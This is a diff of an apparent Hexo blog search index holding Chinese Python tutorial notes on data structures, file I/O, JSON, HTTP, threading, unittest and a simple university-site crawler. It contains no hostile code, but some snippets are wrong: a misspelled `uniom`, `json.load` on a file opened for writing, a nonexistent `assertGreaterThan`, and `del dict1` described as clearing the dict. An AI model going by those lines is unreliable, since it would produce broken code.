+a.count('b')	#元素'b'在列表中出现的次数
+a.__len__()		#返回列表的长度
+</code></pre>
+<p><strong>tuple-元祖</strong></p>
+<pre><code class="language-python"># 元组和列表的区别是：元组中的元素不可变；共同点是都可以使用“[]”进行取值
+a = ('a','b','c')	# 创建元组
+b = a[2]		# ‘c’
+</code></pre>
+<p><strong>dict-字典</strong></p>
+<pre><code class="language-python">dict1 = {} # 创建dict
+dict1['a'] = 100 # 添加元素
+key_list = list(i.keys()) # 获取key列表
+del dict1 # 清空dict
+del dict1['a'] # 删除键值对 ———— 'a':100
+</code></pre>
+<p><strong>set-集合</strong></p>
+<pre><code class="language-python">set1 = {1,2} # 创建set1
+set1.add(3) # 新增元素，set1为 {1,2,3}
+set1.add(2) # 添加set中已存在的元素，不改变set，仍为 {1,2,3}
+set1.add([1,2]) # 报错，不可add可变对象
+set1.remove(1) # 从set1中删去元素 1，set1变为 {2,3}
+set1.remove(4) # 从set1中删去元素 4，报错，因为set1中不存在元素 4
+set1.discard(3) # 从set1中删去元素 3，set1变为 {2}
+set1.discard(5) # 从set1中删去元素 5，set1中不存在元素5，set1仍为 {2}，不报错
+
+set2 = {2,3} # 创建set2
+set3 = set2.uniom(set1) # 并集
+set3 = set2.intersection(set1) # 交集
+set3 = set2.difference(set1) # 差集
+</code></pre>
+<h1>类型转换函数</h1>
+<pre><code class="language-python">bool()		# 根据传入的参数的逻辑值创建一个新的布尔值
+int()		# 根据传入的参数创建一个新的整数
+float()		# 根据传入的参数创建一个新的浮点数
+
+bin()		# 将整数转换成2进制字符串
+oct()		# 将整数转化成8进制数字符串
+hex()		# 将整数转换成16进制字符串
+
+ord()		# 返回Unicode字符对应的整数
+chr()		# 返回整数所对应的Unicode字符
+str()		# 返回一个对象的字符串表现形式
+
+tuple()		# 根据传入的参数创建一个新的元组
+list()		# 根据传入的参数创建一个新的列表
+dict()		# 根据传入的参数创建一个新的字典
+set()		# 根据传入的参数创建一个新的集合
+</code></pre>
+<h1>文件操作</h1>
+<h2 id="文件读写"><a class="header-anchor" href="#文件读写"></a>文件读写</h2>
+<pre><code class="language-python">file1 = open(&quot;file_name&quot;,&quot;${mode}&quot;)
+file1.write()
+file1.close
+</code></pre>
+<p>mode如下表所示</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">含义</th>
+<th>文件不存在时</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>r</code></td>
+<td style="text-align:center">打开文件以阅读（默认模式）</td>
+<td>报错</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>w</code></td>
+<td style="text-align:center">打开文件以写入，覆盖原文件</td>
+<td>创建</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>a</code></td>
+<td style="text-align:center">打开写入，追加到文件末尾</td>
+<td>创建</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>b</code></td>
+<td style="text-align:center">二进制模式，与<code>r</code> <code>w</code>一起使用</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>t</code></td>
+<td style="text-align:center">文本模式（默认就有，不用自己写）</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>+</code></td>
+<td style="text-align:center">打开文件进行更新（读取和写入）</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="常用方法"><a class="header-anchor" href="#常用方法"></a>常用方法</h2>
+<pre><code class="language-python">__file__ # 当前文件的路径（可能为相对路径，取决于python文件执行的方式）
+os.path.realpath(__file__) # 获取当前文件的绝对路径
+os.path.dirname(os.path.realpath(__file__)) # 获取当前文件所在目录（不包含文件名）
+os.path.join(path,&quot;test.yaml&quot;) # 由目录和文件名结合成为新的文件绝对路径
+</code></pre>
+<h1>import 的使用</h1>
+<p>​	一个<code>.py</code>文件可以看作是一个模块（module），使用<code>import</code>命令将一个模块引入当前python文件，则可以在当前文件使用引入模块中定义的变量，函数等。</p>
+<pre><code class="language-python">import module_name	#module_name.py文件可以在sys.path中或者当前文件所在文件夹中
+import module_name as mod #引入module_name并设置别名为 mod
+from module_name import xxx		#从module_name.py中引入xxx变量或者xxx函数
+#从系统目录或当前目录的package_name包里找到module_name.py并引入
+from package_name import module_name
+</code></pre>
+<p>一个包（package）是模块或包的集合，其本质是一个含有<code>__init__.py</code>的文件夹，且<code>__init__.py</code>可以为空。</p>
+<h1>序列化和反序列化</h1>
+<p>序列化</p>
+<pre><code class="language-python">import json
+
+dict1 = {&quot;name&quot;:&quot;Dawnyh&quot;, &quot;age&quot;:20, &quot;id&quot;:&quot;2333&quot;}
+json_str = json.dumps(dict1) # 将dict1转为json格式的字符串
+dict2 = json.loads(json_str) # 把字符串反序列化为一个新的dict
+
+with open(&quot;file1.json&quot;,&quot;w&quot;) as f:
+    json.dump(dict1, f) # 序列化后保存到文件
+with open(&quot;file1.json&quot;,&quot;w&quot;) as f:
+    dict3 = json.load(f) # 从文件反序列化为dict
+</code></pre>
+<h1>HTTP</h1>
+<h2 id="发起请求"><a class="header-anchor" href="#发起请求"></a>发起请求</h2>
+<p>要在python程序中访问外部网站，可以使用<code>requests</code>模块，这是一个功能强大的http请求工具</p>
+<pre><code class="language-python">import requests
+url = &quot;http://example.com&quot;
+#获取响应包
+r = requests.get(url)
+try:
+	#判断相应包状态码，若不为200则抛出异常
+	r.raise_for_status()
+	#设置编码方式为从内容中分析出的编码方式
+	r.encoding = r.apparent_encoding
+except:
+	print(&quot;error!&quot;)
+
+#获取响应包内容
+print(r.text)
+</code></pre>
+<h2 id="处理请求"><a class="header-anchor" href="#处理请求"></a>处理请求</h2>
+<pre><code class="language-python">import socket
+
+HOST,PORT = '0.0.0.0',18080
+
+# 创建socket，AF_INET表示使用IPv4协议，SOCK_STREAM表示采用TCP协议通信
+listen_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+# SO_REUSEADDR允许单个进程捆绑同一端口到多个套接字上
+listen_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+listen_socket.bind((HOST,PORT)) # 绑定IP和端口
+listen_socket.listen(1)
+print('Serving HTTP on port %s ...' % PORT)
+while True:
+	client_connection,client_address = listen_socket.accept()
+	request = client_connection.recv(1024)
+	# 输出请求内容
+    print(request)
+	
+    # 返回响应内容
+	http_response = b&quot;&quot;&quot;
+	HTTP/1.1 200 OK\r\n
+	\r\n
+	Hello,world!
+	&quot;&quot;&quot;
+	client_connection.send(http_response)
+	client_connection.close()
+</code></pre>
+<h1>函数装饰器</h1>
+<p>在python中，一切皆对象，包括函数。所以我们可以把函数赋值给变量，也可以把函数作为另一个函数的参数或者返回值，这就是python函数装饰器的基础。python中的装饰器也是一个函数，这个函数的作用是为其他函数增加一些流程或者说行为，也就是装饰。</p>
+<p>python函数装饰器常用于权限认证以及记录日志</p>
+<h1>并发</h1>
+<h2 id="多进程"><a class="header-anchor" href="#多进程"></a>多进程</h2>
+<p>考虑到跨平台编程的需求，使用multiprocessing模块中的Process类进行子进程的创建和启动</p>
+<pre><code class="language-python">from multiprocessing import Process
+from os import getpid
+from random import randint
+from time import time, sleep
+
+
+def download_task(filename):
+    print('启动下载进程，进程号[%d].' % getpid())
+    print('开始下载%s...' % filename)
+    time_to_download = randint(5, 10) # 5到10之间的随机整数
+    sleep(time_to_download)
+    print('%s下载完成! 耗费了%d秒' % (filename, time_to_download))
+
+
+def main():
+    start = time()
+    # 创建进程对象p1，执行函数download_task，传入参数('Python从入门到住院.pdf', )
+    p1 = Process(target=download_task, args=('Python从入门到住院.pdf', ))
+    p1.start() # 启动进程
+    p2 = Process(target=download_task, args=('Peking Hot.avi', ))
+    p2.start()
+    p1.join() # 等待进程执行结束
+    p2.join()
+    end = time()
+    print('总共耗费了%.2f秒.' % (end - start))
+
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<p>在多个进程进行同步时，则需要用到进程间通信</p>
+<pre><code class="language-python">from multiprocessing import Process,Queue
+
+def print_pingpong(queue,str1):
+	while queue.qsize() &lt; 10: # 判断队列中的元素个数
+		print(queue.qsize())
+		queue.put(1) # 将元素入队列
+		# print(str1)
+		
+def main1():
+	queue = Queue(10) # 创建一个队列
+    # 把队列作为参数传入
+	p1 = Process(target=print_pingpong, args=(queue,'ping', )) 
+	p1.start()
+	p2 = Process(target=print_pingpong, args=(queue,'pong', ))
+	p2.start()
+	p1.join()
+	p2.join()
+
+if __name__ == '__main__':
+    main1()
+</code></pre>
+<h2 id="多线程"><a class="header-anchor" href="#多线程"></a>多线程</h2>
+<p>使用<code>threading</code>模块创建多线程程序，创建线程的方式有从函数启动和从类启动</p>
+<p>从函数启动的示例代码如下：</p>
+<pre><code class="language-python">import time
+from threading import Thread
+
+
+def sub_task(name:str):
+    print(name)
+    time.sleep(2)
+    print(f'{name} done!')
+
+
+t1 = Thread(target=sub_task, args=('bob',))
+t2 = Thread(target=sub_task, args=('otto',))
+
+t1.start()
+t2.start()
+
+t1.join()
+t2.join()
+
+print('all done!')
+</code></pre>
+<p>从类启动的示例代码如下：</p>
+<pre><code class="language-python">#!/usr/bin/python3
+
+# 转自：https://www.runoob.com/python3/python3-multithreading.html
+
+import threading
+import time
+
+exitFlag = 0
+
+class myThread (threading.Thread):
+    def __init__(self, threadID, name, delay):
+        threading.Thread.__init__(self)
+        self.threadID = threadID
+        self.name = name
+        self.delay = delay
+    def run(self):
+        print (&quot;开始线程：&quot; + self.name)
+        print_time(self.name, self.delay, 5)
+        print (&quot;退出线程：&quot; + self.name)
+
+def print_time(threadName, delay, counter):
+    while counter:
+        if exitFlag:
+            threadName.exit()
+        time.sleep(delay)
+        print (&quot;%s: %s&quot; % (threadName, time.ctime(time.time())))
+        counter -= 1
+
+# 创建新线程
+thread1 = myThread(1, &quot;Thread-1&quot;, 1)
+thread2 = myThread(2, &quot;Thread-2&quot;, 2)
+
+# 开启新线程
+thread1.start()
+thread2.start()
+thread1.join()
+thread2.join()
+print (&quot;退出主线程&quot;)
+</code></pre>
+<h2 id="协程"><a class="header-anchor" href="#协程"></a>协程</h2>
+<p>使用<code>async</code>和<code>await</code>关键字进行声明</p>
+<p>例如：</p>
+<pre><code class="language-python">async def get_burgers(number: int):# 告诉python这个函数支持异步执行
+  # Do some asynchronous stuff to create the burgers
+  return burgers
+
+burgers = await get_burgers(2) # 告诉python可以挂起这一步的执行先去执行别的操作
+</code></pre>
+<p>ps: <code>await</code>必须在使用<code>async def</code>声明的函数中使用</p>
+<h1>单元测试</h1>
+<p>对函数进行测试，给他一个输入，验证他的输出是否符合预期</p>
+<pre><code class="language-python">import unittest # 导入单元测试模块
+
+# 要测试的函数
+def my_div(a, b):
+    return a / b
+
+# 测试类
+class TestFunc(unittest.TestCase):
+    # 测试用例
+    def test_div(self):
+        self.assertEqual(2, my_div(2,1)) # 判断结果是否等于
+        self.assertEqual(-2, my_div(2,-1))
+        
+    def test_div2(self): # 可以同时测试多个函数
+        pass
+
+if __name__ == &quot;__main__&quot;:
+    unittest.main()
+</code></pre>
+<p>在 unittest 的模块中，还有特别丰富的测试方式，常用如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">assert</th>
+<th style="text-align:left">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">assertEqual(a, b)</td>
+<td style="text-align:left"><code>a == b</code></td>
+</tr>
+<tr>
+<td style="text-align:left">assertNotEqual(a, b)</td>
+<td style="text-align:left"><code>a != b</code></td>
+</tr>
+<tr>
+<td style="text-align:left">assertTrue(condition)</td>
+<td style="text-align:left">condition 是不是 True</td>
+</tr>
+<tr>
+<td style="text-align:left">assertFalse(condition)</td>
+<td style="text-align:left">condition 是不是 False</td>
+</tr>
+<tr>
+<td style="text-align:left">assertGreater(a, b)</td>
+<td style="text-align:left"><code>a &gt; b</code></td>
+</tr>
+<tr>
+<td style="text-align:left">assertGreaterThan(a, b)</td>
+<td style="text-align:left"><code>a &gt;= b</code></td>
+</tr>
+<tr>
+<td style="text-align:left">assertLess(a, b)</td>
+<td style="text-align:left"><code>a &lt; b</code></td>
+</tr>
+<tr>
+<td style="text-align:left">assertLessEqual(a, b)</td>
+<td style="text-align:left"><code>a &lt;= b</code></td>
+</tr>
+<tr>
+<td style="text-align:left">assertIs(a, b)</td>
+<td style="text-align:left"><code>a is b</code>，a 和 b 是不是同一对象</td>
+</tr>
+<tr>
+<td style="text-align:left">assertIsNot(a, b)</td>
+<td style="text-align:left"><code>a is not b</code>，a 和 b 是不是不同对象</td>
+</tr>
+<tr>
+<td style="text-align:left">assertIsNone(a)</td>
+<td style="text-align:left"><code>a is None</code>，a 是不是 None</td>
+</tr>
+<tr>
+<td style="text-align:left">assertIsNotNone(a)</td>
+<td style="text-align:left"><code>a is not None</code>，a 不是 None？</td>
+</tr>
+<tr>
+<td style="text-align:left">assertIn(a, b)</td>
+<td style="text-align:left"><code>a in b</code>, a 在 b 里面？</td>
+</tr>
+<tr>
+<td style="text-align:left">assertNotIn(a, b)</td>
+<td style="text-align:left"><code>a not in b</code>，a 不在 b 里？</td>
+</tr>
+<tr>
+<td style="text-align:left">assertRaises(err)</td>
+<td style="text-align:left">通常和 with 一起用，判断 with 里的功能是否会报错</td>
+</tr>
+</tbody>
+</table>
+<h1>一些特性</h1>
+<p><strong>问号表达式在python中的实现</strong></p>
+<p>在python中，and 和 or 运算符并不是返回bool值，而是返回表达式中使结果确定的那个值。例如 5 and 1 的结果是1，因为 and 运算符只有在两边都不为 0 的时候运算结果才不为 0，从左往右判断，5不为0满足条件，1不为0确定了表达式结果不为0，因此表达式的结果为1。又比如表达式 2 or 1 的结果为 2 ，因为 or 运算符只需要表达式两边有一方不为0即表达式结果不为0，因此表达式判断到 2 的时候，发现2不为0，那么表达式结果就确定了（True），因此把 2 作为返回值。</p>
+<p>利用这个特性，我们就可以实现问号表达式了</p>
+<pre><code class="language-python">a = int(input(&quot;输入一个大于0的整数：&quot;))
+b = a%2==1 and &quot;奇数&quot; or &quot;偶数&quot;
+print(f'{a}为{b}')
+</code></pre>
+<p>运行结果如下：</p>
+<p><img src="/2021/01/30/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%9F%BA%E7%A1%80%E7%AF%87/image-20230103091215036.png" alt="image-20230103091215036"></p>
+<h1>python3  VS  python2</h1>
+<p><strong>在编码上的区别</strong></p>
+<p>在 Python2 中，字符串有两个类型，一个是 unicode，一个是 str，前者表示文本字符串，后者表示字节序列，不过两者并没有明显的界限，开发时容易出现编码错误。在 Python3 中对两者做了严格区分，分别用 str 表示字符串，bytes 表示字节序列，任何需要写入文本或者网络传输的数据都只接收字节序列，这就从源头上阻止了编码错误的问题。</p>
+<p>要指定一个字符串为 bytes 类型，有三种方法：</p>
+<ul>
+<li>字符串前（引号前）加上前缀<code>b</code> ，但这种方法仅支持 ASCII 字符串；</li>
+<li>使用<code>encode()</code>函数</li>
+<li>使用<code>bytes()</code>构造函数</li>
+</ul>
+<pre><code class="language-python">str_a = b&quot;Hello World!&quot;				#正确
+str_b = b&quot;一个字符串。&quot;				#错误
+str_c = &quot;一个字符串&quot;.encode('utf-8')	#正确，不指定编码方式也默认以utf-8编码
+str_d = bytes(&quot;abcde&quot;,'utf-8')		#正确，第二个参数不可省略
+</code></pre>
+<p>C语言的 printf 函数不支持 Unicode 字符串的输出。在 python3 中想要调用C语言的printf函数，需要将参数由 Unicode 字符串转化为字节序列</p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python实战</title>
+    <url>/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/</url>
+    <content><![CDATA[<h2 id="Python爬虫"><a class="header-anchor" href="#Python爬虫"></a>Python爬虫</h2>
+<p>从<a href="http://www.csu.edu.cn/index/xndh.htm">中南大学校内导航</a>中爬取校内网站名称和对应的链接。</p>
+<p>爬虫程序主要分为html页面获取和数据提取两个部分，接下来分别说明其实现方法。</p>
+<h3 id="获取网页"><a class="header-anchor" href="#获取网页"></a>获取网页</h3>
+<p>使用requests库来获取网站的html页面</p>
+<pre><code class="language-python">import requests
+url = &quot;http://www.csu.edu.cn/index/xndh.htm&quot;
+try:
+    r = requests.get(url)
+    r.raise_for_status()				#检查r的状态码是否为200，若不是则抛出异常
+    r.encoding = r.apparent_encoding	#设置编码方式为从内容中分析出的编码方式
+except:
+    print(&quot;error!&quot;)
+</code></pre>
+<p><img src="/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/20200225122713475.png" alt="img"></p>
+<p>encoding是从http中的header中的charset字段中提取的编码方式，若header中没有charset字段则默认为ISO-8859-1编码模式，则无法解析中文，产生乱码</p>
+<h3 id="提取内容"><a class="header-anchor" href="#提取内容"></a>提取内容</h3>
+<p>利用BeautifulSoup库可以很方便地对从HTML或XML文档中提取我们想要的数据。</p>
+<pre><code class="language-python">from bs4 import BeautifulSoup
+html = r.text
+soup = BeautifulSoup(html,'html.parser')		#将html解析成BeautifulSoup对象
+
+#BeautifulSoup类的find_all()函数可以从文档树中找到特定的标签（tag）
+#这里获得所有的a标签
+for i in soup.find_all('a'):
+    #tag的属性值可直接用 tag_name['属性名'] 的方式获得
+    #判断链接地址是否为一个网站
+    if not i['href'].find('http'):
+        # 构造输出
+        # tag_name.string 即 &lt;tag_name&gt;xxx&lt;/tag_name&gt; 中的xxx
+        str1 = &quot;网址：&quot; + str(i['href']) + &quot;   名称：&quot; + str(i.string) + '\n'
+		# 输出一条链接的地址及名称
+        print(str1)
+</code></pre>
+<p>利用以上代码就可以实现一个简单的爬虫程序了。</p>
+<p>爬虫的原理比较简单，关键在于如何对爬取到的数据进行筛选的过程。</p>
+<p>之后可以尝试对网页中的链接进行递归爬取等</p>
+<h3 id="链接去重"><a class="header-anchor" href="#链接去重"></a>链接去重</h3>
+<h3 id="并发爬取"><a class="header-anchor" href="#并发爬取"></a>并发爬取</h3>
+<h2 id="爬虫框架"><a class="header-anchor" href="#爬虫框架"></a>爬虫框架</h2>
+<h3 id="scrapy"><a class="header-anchor" href="#scrapy"></a>scrapy</h3>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -3399,471 +3934,6 @@ func divide(a, b int) (int, error) {
       </tags>
   </entry>
   <entry>
-    <title>Python基础</title>
-    <url>/2021/01/30/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
-    <content><![CDATA[<h2 id="输入输出"><a class="header-anchor" href="#输入输出"></a>输入输出</h2>
-<p><strong>输出</strong></p>
-<pre><code class="language-python">print('%d,%d'%(i,j),end=&quot;&quot;) # print格式化字符串
-param = 'hello'
-print(f'{param}') # f字符串输出参数
-
-# 浮点数保留精度
-a = 2.345
-print('%.2f'%a) # 2.35 ,四舍五入
-print(round(a,2)) # 2.34 ，五舍六入
-</code></pre>
-<p><strong>输入</strong></p>
-<pre><code class="language-python">a = input(&quot;input a number!\n&quot;)
-</code></pre>
-<h2 id="常用字符串函数"><a class="header-anchor" href="#常用字符串函数"></a>常用字符串函数</h2>
-<pre><code class="language-python"># 1.字母处理：
-.upper()    # 全部大写
-.lower()    # 全部小写
-.swapcase()    # 大小写互换
-.capitalize()    # 首字母大写，其余小写
-.title()    # 首字母大写
-
-# 2.格式化相关
-.ljust(width)     # 获取固定长度，左对齐，右边不够用空格补齐
-.rjust(width)     # 获取固定长度，右对齐，左边不够用空格补齐
-.center(width)  # 获取固定长度，中间对齐，两边不够用空格补齐
-.zfill(width)      # 获取固定长度，右对齐，左边不足用0补齐
-
-# 3.字符串搜索相关
-.find()    # 搜索指定字符串，找到则返回对应下标，没有则返回-1
-.index()    # 同上，但是找不到会报错
-.rfind()    # 从右边开始查找
-.count()    # 统计指定的字符串出现的次数
-
-# 4.字符串处理
-.split(&quot;分割符(串)&quot;,[分割次数])	# 分割字符串，得到一个子串列表
-.replace(&quot;原子串&quot;,&quot;新子串&quot;)	# 子串替换
-</code></pre>
-<h2 id="常用数据结构"><a class="header-anchor" href="#常用数据结构"></a>常用数据结构</h2>
-<p><strong>list-列表</strong></p>
-<pre><code class="language-python">a = []
-a.append('a')	#在列表最后加入一个元素'a'
-a.pop(0)		#删除列表中索引为0的元素
-a.insert(0,'b')	#在列表索引为0的位置插入元素'b',原本该位置及以后的元素后移一位
-a.index('b')	#返回元素'b'在列表中第一次出现的位置
-a.count('b')	#元素'b'在列表中出现的次数
-a.__len__()		#返回列表的长度
-</code></pre>
-<p><strong>tuple-元祖</strong></p>
-<pre><code class="language-python"># 元组和列表的区别是：元组中的元素不可变；共同点是都可以使用“[]”进行取值
-a = ('a','b','c')	# 创建元组
-b = a[2]		# ‘c’
-</code></pre>
-<p><strong>dict-字典</strong></p>
-<pre><code class="language-python">dict1 = {} # 创建dict
-dict1['a'] = 100 # 添加元素
-key_list = list(i.keys()) # 获取key列表
-del dict1 # 清空dict
-del dict1['a'] # 删除键值对 ———— 'a':100
-</code></pre>
-<p><strong>set-集合</strong></p>
-<pre><code class="language-python">set1 = {1,2} # 创建set1
-set1.add(3) # 新增元素，set1为 {1,2,3}
-set1.add(2) # 添加set中已存在的元素，不改变set，仍为 {1,2,3}
-set1.add([1,2]) # 报错，不可add可变对象
-set1.remove(1) # 从set1中删去元素 1，set1变为 {2,3}
-set1.remove(4) # 从set1中删去元素 4，报错，因为set1中不存在元素 4
-set1.discard(3) # 从set1中删去元素 3，set1变为 {2}
-set1.discard(5) # 从set1中删去元素 5，set1中不存在元素5，set1仍为 {2}，不报错
-
-set2 = {2,3} # 创建set2
-set3 = set2.uniom(set1) # 并集
-set3 = set2.intersection(set1) # 交集
-set3 = set2.difference(set1) # 差集
-</code></pre>
-<h2 id="类型转换函数"><a class="header-anchor" href="#类型转换函数"></a>类型转换函数</h2>
-<pre><code class="language-python">bool()		# 根据传入的参数的逻辑值创建一个新的布尔值
-int()		# 根据传入的参数创建一个新的整数
-float()		# 根据传入的参数创建一个新的浮点数
-
-bin()		# 将整数转换成2进制字符串
-oct()		# 将整数转化成8进制数字符串
-hex()		# 将整数转换成16进制字符串
-
-ord()		# 返回Unicode字符对应的整数
-chr()		# 返回整数所对应的Unicode字符
-str()		# 返回一个对象的字符串表现形式
-
-tuple()		# 根据传入的参数创建一个新的元组
-list()		# 根据传入的参数创建一个新的列表
-dict()		# 根据传入的参数创建一个新的字典
-set()		# 根据传入的参数创建一个新的集合
-</code></pre>
-<h2 id="文件操作"><a class="header-anchor" href="#文件操作"></a>文件操作</h2>
-<h3 id="文件读写"><a class="header-anchor" href="#文件读写"></a>文件读写</h3>
-<pre><code class="language-python">file1 = open(&quot;file_name&quot;,&quot;${mode}&quot;)
-file1.write()
-file1.close
-</code></pre>
-<p>mode如下表所示</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">字符</th>
-<th style="text-align:center">含义</th>
-<th>文件不存在时</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center"><code>r</code></td>
-<td style="text-align:center">打开文件以阅读（默认模式）</td>
-<td>报错</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>w</code></td>
-<td style="text-align:center">打开文件以写入，覆盖原文件</td>
-<td>创建</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>a</code></td>
-<td style="text-align:center">打开写入，追加到文件末尾</td>
-<td>创建</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>b</code></td>
-<td style="text-align:center">二进制模式，与<code>r</code> <code>w</code>一起使用</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center"><code>t</code></td>
-<td style="text-align:center">文本模式（默认就有，不用自己写）</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center"><code>+</code></td>
-<td style="text-align:center">打开文件进行更新（读取和写入）</td>
-<td></td>
-</tr>
-</tbody>
-</table>
-<h3 id="常用方法"><a class="header-anchor" href="#常用方法"></a>常用方法</h3>
-<pre><code class="language-python">__file__ # 当前文件的路径（可能为相对路径，取决于python文件执行的方式）
-os.path.realpath(__file__) # 获取当前文件的绝对路径
-os.path.dirname(os.path.realpath(__file__)) # 获取当前文件所在目录（不包含文件名）
-os.path.join(path,&quot;test.yaml&quot;) # 由目录和文件名结合成为新的文件绝对路径
-</code></pre>
-<h2 id="import-的使用"><a class="header-anchor" href="#import-的使用"></a>import 的使用</h2>
-<p>​	一个<code>.py</code>文件可以看作是一个模块（module），使用<code>import</code>命令将一个模块引入当前python文件，则可以在当前文件使用引入模块中定义的变量，函数等。</p>
-<pre><code class="language-python">import module_name	#module_name.py文件可以在sys.path中或者当前文件所在文件夹中
-import module_name as mod #引入module_name并设置别名为 mod
-from module_name import xxx		#从module_name.py中引入xxx变量或者xxx函数
-#从系统目录或当前目录的package_name包里找到module_name.py并引入
-from package_name import module_name
-</code></pre>
-<p>一个包（package）是模块或包的集合，其本质是一个含有<code>__init__.py</code>的文件夹，且<code>__init__.py</code>可以为空。</p>
-<h2 id="序列化和反序列化"><a class="header-anchor" href="#序列化和反序列化"></a>序列化和反序列化</h2>
-<p>序列化</p>
-<pre><code class="language-python">import json
-
-dict1 = {&quot;name&quot;:&quot;Dawnyh&quot;, &quot;age&quot;:20, &quot;id&quot;:&quot;2333&quot;}
-json_str = json.dumps(dict1) # 将dict1转为json格式的字符串
-dict2 = json.loads(json_str) # 把字符串反序列化为一个新的dict
-
-with open(&quot;file1.json&quot;,&quot;w&quot;) as f:
-    json.dump(dict1, f) # 序列化后保存到文件
-with open(&quot;file1.json&quot;,&quot;w&quot;) as f:
-    dict3 = json.load(f) # 从文件反序列化为dict
-</code></pre>
-<h2 id="HTTP"><a class="header-anchor" href="#HTTP"></a>HTTP</h2>
-<h3 id="发起请求"><a class="header-anchor" href="#发起请求"></a>发起请求</h3>
-<p>要在python程序中访问外部网站，可以使用<code>requests</code>模块，这是一个功能强大的http请求工具</p>
-<pre><code class="language-python">import requests
-url = &quot;http://example.com&quot;
-#获取响应包
-r = requests.get(url)
-try:
-	#判断相应包状态码，若不为200则抛出异常
-	r.raise_for_status()
-	#设置编码方式为从内容中分析出的编码方式
-	r.encoding = r.apparent_encoding
-except:
-	print(&quot;error!&quot;)
-
-#获取响应包内容
-print(r.text)
-</code></pre>
-<h3 id="处理请求"><a class="header-anchor" href="#处理请求"></a>处理请求</h3>
-<pre><code class="language-python">import socket
-
-HOST,PORT = '0.0.0.0',18080
-
-# 创建socket，AF_INET表示使用IPv4协议，SOCK_STREAM表示采用TCP协议通信
-listen_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-# SO_REUSEADDR允许单个进程捆绑同一端口到多个套接字上
-listen_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-listen_socket.bind((HOST,PORT)) # 绑定IP和端口
-listen_socket.listen(1)
-print('Serving HTTP on port %s ...' % PORT)
-while True:
-	client_connection,client_address = listen_socket.accept()
-	request = client_connection.recv(1024)
-	# 输出请求内容
-    print(request)
-	
-    # 返回响应内容
-	http_response = b&quot;&quot;&quot;
-	HTTP/1.1 200 OK\r\n
-	\r\n
-	Hello,world!
-	&quot;&quot;&quot;
-	client_connection.send(http_response)
-	client_connection.close()
-</code></pre>
-<h2 id="函数装饰器"><a class="header-anchor" href="#函数装饰器"></a>函数装饰器</h2>
-<p>在python中，一切皆对象，包括函数。所以我们可以把函数赋值给变量，也可以把函数作为另一个函数的参数或者返回值，这就是python函数装饰器的基础。python中的装饰器也是一个函数，这个函数的作用是为其他函数增加一些流程或者说行为，也就是装饰。</p>
-<p>python函数装饰器常用于权限认证以及记录日志</p>
-<h2 id="并发"><a class="header-anchor" href="#并发"></a>并发</h2>
-<h3 id="多进程"><a class="header-anchor" href="#多进程"></a>多进程</h3>
-<p>考虑到跨平台编程的需求，使用multiprocessing模块中的Process类进行子进程的创建和启动</p>
-<pre><code class="language-python">from multiprocessing import Process
-from os import getpid
-from random import randint
-from time import time, sleep
-
-
-def download_task(filename):
-    print('启动下载进程，进程号[%d].' % getpid())
-    print('开始下载%s...' % filename)
-    time_to_download = randint(5, 10) # 5到10之间的随机整数
-    sleep(time_to_download)
-    print('%s下载完成! 耗费了%d秒' % (filename, time_to_download))
-
-
-def main():
-    start = time()
-    # 创建进程对象p1，执行函数download_task，传入参数('Python从入门到住院.pdf', )
-    p1 = Process(target=download_task, args=('Python从入门到住院.pdf', ))
-    p1.start() # 启动进程
-    p2 = Process(target=download_task, args=('Peking Hot.avi', ))
-    p2.start()
-    p1.join() # 等待进程执行结束
-    p2.join()
-    end = time()
-    print('总共耗费了%.2f秒.' % (end - start))
-
-
-if __name__ == '__main__':
-    main()
-</code></pre>
-<p>在多个进程进行同步时，则需要用到进程间通信</p>
-<pre><code class="language-python">from multiprocessing import Process,Queue
-
-def print_pingpong(queue,str1):
-	while queue.qsize() &lt; 10: # 判断队列中的元素个数
-		print(queue.qsize())
-		queue.put(1) # 将元素入队列
-		# print(str1)
-		
-def main1():
-	queue = Queue(10) # 创建一个队列
-    # 把队列作为参数传入
-	p1 = Process(target=print_pingpong, args=(queue,'ping', )) 
-	p1.start()
-	p2 = Process(target=print_pingpong, args=(queue,'pong', ))
-	p2.start()
-	p1.join()
-	p2.join()
-
-if __name__ == '__main__':
-    main1()
-</code></pre>
-<h3 id="多线程"><a class="header-anchor" href="#多线程"></a>多线程</h3>
-<p>使用<code>threading</code>模块创建多线程程序，创建线程的方式有从函数启动和从类启动</p>
